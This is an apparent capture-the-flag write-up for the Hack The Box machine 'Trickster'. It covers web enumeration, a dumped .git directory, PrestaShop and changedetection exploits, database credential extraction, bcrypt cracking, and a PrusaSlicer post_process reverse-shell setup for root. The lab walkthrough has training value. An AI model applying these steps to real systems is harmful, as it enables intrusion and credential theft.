## Port Scanning and Initial Enumeration

**Note**: Add `trickster.htb` to your hosts file.

```bash
# Nmap 7.94SVN scan initiated Fri Sep 27 11:20:27 2024
nmap -p- -v -A -oA my_data/trickster/nmap-trickster 10.10.11.34
```

### Nmap Results

```
Nmap scan report for 10.10.11.34
Host is up (0.075s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
```

**Host Details:**
- **SSH:** OpenSSH 8.9p1
- **HTTP:** Apache/2.4.52 (Ubuntu), redirects to `http://trickster.htb/`

---

## Enumeration of Web Services

### Discovering Virtual Hosts

The main site did not reveal much initially, but examining the source code revealed another virtual host: `shop.trickster.htb`. After adding it to the hosts file, we accessed this second vhost.

### Gobuster Enumeration

```bash
gobuster dir --url http://shop.trickster.htb --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -b 403 --exclude-length 283
```

#### Gobuster Results

```
/.git (Status: 301)
```

---

## Dumping `.git` Directory

Using `git-dumper`, we extracted the `.git` directory contents.

### Extracted Files

```
admin634ewutrx1jgitlooaj
autoload.php
error500.html
index.php
init.php
Install_PrestaShop.html
INSTALL.txt
LICENSES
Makefile
```

---

## Identifying PrestaShop and Exploiting CVE-2024-34716

### PrestaShop Detected
The files revealed that the site is built with PrestaShop.

### Exploitation Steps

1. Modify the provided exploit files from the repository:
   - [PrestaShop CVE-2024-34716 Exploit](https://gitlab.com/hashborgir/prestashop-cve-2024-34716)

2. Execute the exploit to gain a `www-data` shell.

```bash
# Follow the repository instructions and adapt the HTML and Python files.
```

---

## Privilege Escalation: Extracting Database Credentials

### Locate Configuration Files

PrestaShop documentation specifies the config file location:

**File Path:** `/app/config/parameters.php`

**File Contents:**

```php
<?php return array (
  'parameters' =>
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
  ),
);
```

### Dumping Database User Hashes

```bash
# Login to MySQL with the extracted credentials
mysql -u ps_user -p
```

Run the following query:

```sql
USE prestashop;
SELECT * FROM ps_employee;
```

### Database Output

| id_employee | lastname | firstname | email               | passwd                                                       |
|-------------|----------|-----------|---------------------|--------------------------------------------------------------|
| 1           | Store    | Trickster | admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C |
| 2           | james    | james     | james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm |

---

## Cracking Hashes with John the Ripper

```bash
john --wordlist='/usr/share/wordlists/rockyou.txt' hashes.txt
```

### Output

```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alwaysandforever (?)     
1g 0:00:00:03 DONE (2024-09-27 12:17) 0.2538g/s 9402p/s 9402c/s 9402C/s bandit2..alkaline
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Results
- Password for **james**: `alwaysandforever`

---

## SSH Access and Privilege Escalation

### SSH into the Box

```bash
ssh james@trickster.htb
# Password: alwaysandforever
```

### Checking Sudo Privileges

```bash
james@trickster:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on trickster.
```

### Exploring the Internal Network

```bash
arp -an
```

#### Output

```
? (10.10.10.2) at 00:50:56:b9:72:68 [ether] on eth0
? (10.10.11.30) at 00:50:56:94:a7:aa [ether] on eth0
? (172.17.0.2) at 02:42:ac:11:00:02 [ether] on docker0
```

### Nmap Scan on Docker Container

```bash
nmap -p- 172.17.0.2
```

#### Output

```
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-09-27 17:29 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.2
Host is up (0.00034s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
5000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 34.51 seconds
```

---

## Port Forwarding and Exploitation of Docker Container

### Setting Up Port Forwarding

```bash
ssh -L 5000:172.17.0.2:5000 james@trickster.htb
```

This forwards port `5000` on the container to the local machine. Access it via `http://localhost:5000`.

### Accessing the Site

The site prompts for a password, but reused credentials work:
- **Username:** james
- **Password:** alwaysandforever

### Exploiting the Container

Use the following CVE to exploit SSTI:
- [CVE-2024-32651](https://github.com/evgeni-semenov/CVE-2024-32651)

#### Instructions
1. Navigate to settings and disable the password.
2. Execute the exploit as per repository instructions.

After you get your shell in the docker container, check out /datastore this is where the recommended docker deploy of changedetect will mount a volume to the host.  If you bring up your own container to compare, you'll see trickster's container has a backup directory.  Didn't have an elegant way of getting these files off the box so I catted the contents of the files | base64 and ctrl+c ctrl+v'd it to my box. Once there I converted them back to zip files, unzipped them and started looking through.  There are .br files which are brotli compressed, uncompressing these with brotli --decompress <file> revealed a config file with adam's password:

adam_admin992

adam is able to sudo prusaslicer which has a rce: https://www.exploit-db.com/exploits/51983


grab the 3mf file in /opt/ to use as the template. you'll need to copy it to your machine since there's no zip utility on trickster.  unzip it, edit Metdata/Slic3r_PE.config

the format for the output will fail so fix that
; output_filename_format = {input_filenamebase}{print_time}.gcode

and set your payload
; post_process = /tmp/travesty.sh

that's the usual bash rev shell

sudo /opt/PrusaSlicer/prusaslicer -s foo.3mf
